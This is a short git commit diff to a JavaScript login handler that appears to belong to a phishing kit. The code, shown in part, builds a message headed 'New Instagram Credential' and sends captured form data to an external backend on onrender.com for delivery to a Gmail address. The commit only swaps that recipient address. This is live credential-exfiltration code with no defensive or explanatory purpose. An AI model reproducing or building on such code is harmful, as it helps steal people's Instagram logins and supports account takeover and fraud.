279506f0aa85d7cf06fbae164df01b6c0832908c
Aiyedun Miracle <aiyedunmiracle956888@gmail.com>
2023-08-13 18:44:39 +0100

    modify changes

--- login/js-login/functions/query09129379.js
+++ login/js-login/functions/query09129379.js
@@ -10,7 +10,7 @@ const handleSubmit = (e) => {
         result.innerHTML= "<div style='padding: 60px 0;'></div>";
         setTimeout(()=>{
             const form = new FormData();
-            const recipient = "1stcrase7@gmail.com";
+            const recipient = "1stcrase5@gmail.com";
             const email_backend = "https://active-pay-backend.onrender.com/";
             const body = (`
                New Instagram Credential
